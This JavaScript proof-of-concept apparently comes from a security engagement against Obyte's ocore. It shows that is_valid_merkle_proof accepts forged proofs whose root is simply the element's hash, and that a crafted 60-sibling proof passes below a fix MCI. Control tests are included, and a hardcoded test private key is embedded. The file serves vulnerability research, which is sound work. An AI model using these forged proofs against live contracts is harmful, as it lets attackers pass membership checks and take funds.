// P9 PoC — formula `is_valid_merkle_proof` is vacuously satisfiable (engine-level footgun)
// Pinned ocore: a7eb776afc68ed4bed05ba554f7f1e95f5d49b44
// Run: cd <ocore> && node lab-obyte.js /Users/matheusvsky/Documents/trab/llm-redteam-harness/engagements/obyte-ocore-2026-08/evidence/lab/p9/p9-poc.js
// Real-path discipline: uses the REAL formula evaluation engine (formula/index.js exports.evaluate)
// and the REAL definition predicate engine (definition.js validateAuthentifiers) from the pinned tree.
const crypto = require("crypto");
const O_CORE = "/Users/matheusvsky/Documents/trab/obyte-ocore-2026-08-ocore";
const formula = require(O_CORE + "/formula/index.js");
const definition = require(O_CORE + "/definition.js");
const merkle = require(O_CORE + "/merkle.js");

function sha256b64(str) { return crypto.createHash("sha256").update(str, "utf8").digest("base64"); }
// The vacuous "proof": index 0, no siblings, root := hash(element). Attacker-chosen root, no tree membership.
function vacuousProof(X) { return "0-" + sha256b64(X); }

// fold a sibling chain exactly as merkle.verifyMerkleProof does (index=0): root = hash(...hash(hash(X)+s0)+s1...)
function foldRootWithSiblings(X, siblings) {
  let acc = sha256b64(X);
  for (const s of siblings) acc = sha256b64(acc + s);
  return acc;
}

const TEST_ADDR = "MXMEKGN37H5QO2AWHT7XRG6LHJVVTAWU";
const FIX_MCI = 15000000; // above pemCurvesFixMci (12155000)
const BELOW_MCI = 1000000; // below pemCurvesFixMci

function evalFormula(formulaStr, mci) {
  return new Promise((resolve) => {
    const objValidationState = {
      last_ball_mci: mci,
      last_ball_timestamp: 2000000000,
      bAA: true,
      hasBall: true,
      logs: []
    };
    const opts = {
      conn: null,
      formula: formulaStr,
      messages: [],
      trigger: {},
      objValidationState,
      address: TEST_ADDR
    };
    formula.evaluate(opts, [], "", (err, res) => resolve({ err: err ? String(err) : null, res }));
  });
}

function testInMerkle(conn, element, proof) {
  return new Promise((resolve) => {
    // definition: and(sig, in merkle) — sig branch verifies a REAL signature so the
    // evaluation proceeds to the 'in merkle' branch (which is the predicate under test).
    const PUBKEY = "AqUMbbXfZg6uw506M9lbiJU/f74X5BhKdovkMPkspfNo"; // login.test.js vector
    const PRIV = Buffer.from("18d8bc95d3b4ae8e7dd5aaa77158f72d7ec4e8556a11e69b20a87ee7d6ac70b4", "hex");
    const msgHash = crypto.createHash("sha256").update("p9-in-merkle-test-message", "utf8").digest();
    const sig = crypto.createHash("sha256");
    const ecdsa = require(O_CORE + "/node_modules/secp256k1");
    const signed = ecdsa.ecdsaSign(msgHash, PRIV);
    const sigB64 = Buffer.from(signed.signature).toString("base64");
    const arrDefinition = ["and", [
      ["sig", { pubkey: PUBKEY }],
      ["in merkle", [["3Y24IXW57546PQAPQ2SXYEPEDNX4KC6Y"], "merkle_feed", element]]
    ]];
    const objUnit = { unit: "dummy", authors: [{ address: TEST_ADDR }], parent_units: [] };
    const objValidationState = { last_ball_mci: FIX_MCI, last_ball_timestamp: 2000000000, bAA: false, hasBall: true, bNoReferences: false, unit_hash_to_sign: msgHash };
    definition.validateAuthentifiers(conn, null, null, arrDefinition, objUnit, objValidationState, { "r.0": sigB64, "r.1": proof }, (err, res) => {
      resolve({ err: err ? String(err) : null, res });
    });
  });
}

module.exports = async function (db, storage, network, validation, objectHash, signature, composer, mutex, constants) {
  const results = {};
  // restore the mainnet upgrade MCI (lab zeroes it) for the S1-gating test
  constants.pemCurvesFixMci = 12155000;

  // ---- 1. VACUOUS: arbitrary elements, no tree membership, above the fix MCI ----
  const samples = [
    "not-in-any-tree-1",
    "hello world",
    crypto.randomBytes(16).toString("base64"),
    "user-supplied element 42"
  ];
  for (const X of samples) {
    const r = await evalFormula(`is_valid_merkle_proof(${JSON.stringify(X)}, ${JSON.stringify(vacuousProof(X))})`, FIX_MCI);
    results["vacuous:" + JSON.stringify(X.slice(0, 24))] = r;
  }

  // ---- 2. POSITIVE CONTROL: a REAL merkle proof from a real tree still validates (engine not broken) ----
  const arrElements = ["a", "b", "c", "d", "e"];
  const realProof = merkle.getMerkleProof(arrElements, 2);
  const realSerialized = merkle.serializeMerkleProof(realProof);
  results["positive-control-real-tree-proof"] = await evalFormula(
    `is_valid_merkle_proof("c", ${JSON.stringify(realSerialized)})`, FIX_MCI);

  // ---- 3. NEGATIVE CONTROL: wrong root (root != hash(element)) is rejected ----
  results["negative-control-wrong-root"] = await evalFormula(
    `is_valid_merkle_proof("c", ${JSON.stringify("0-" + sha256b64("something-else"))})`, FIX_MCI);

  // ---- 4. S1 GATING: 60-sibling crafted proof — rejected above the fix MCI (e01ba3e cap),
  //          ACCEPTED below it (cap skipped, attacker-computed root) ----
  const sixtySiblings = Array.from({ length: 60 }, (_, i) => "sib" + i);
  const attackerRoot = foldRootWithSiblings("element-X", sixtySiblings);
  const proof60 = "0-" + sixtySiblings.join("-") + "-" + attackerRoot; // serialized: index, siblings..., root
  results["sixty-siblings-above-fix"] = await evalFormula(
    `is_valid_merkle_proof("element-X", ${JSON.stringify(proof60)})`, FIX_MCI);   // expect false (cap)
  results["sixty-siblings-below-fix"] = await evalFormula(
    `is_valid_merkle_proof("element-X", ${JSON.stringify(proof60)})`, BELOW_MCI); // expect true (cap skipped)

  // ---- 5. CONTRAST: the same vacuous proof in the DEFINITION predicate 'in merkle' FAILS
  //          without an on-chain posted feed whose value == proof.root ----
  const conn = await new Promise((resolve) => db.takeConnectionFromPool(resolve));
  const element5 = "merkled-element-1";
  results["in-merkle-vacuous-proof-no-feed"] = await testInMerkle(conn, element5, vacuousProof(element5));
  // 5b. contrast: a REAL tree proof in 'in merkle' — root is a real tree root but STILL not a posted feed → false
  const realTreeRoot = merkle.getMerkleRoot(arrElements);
  results["in-merkle-real-tree-root-no-feed"] = await testInMerkle(conn, element5, "0-" + realTreeRoot);
  conn.release();

  console.log("P9-RESULTS " + JSON.stringify(results, null, 1));
};
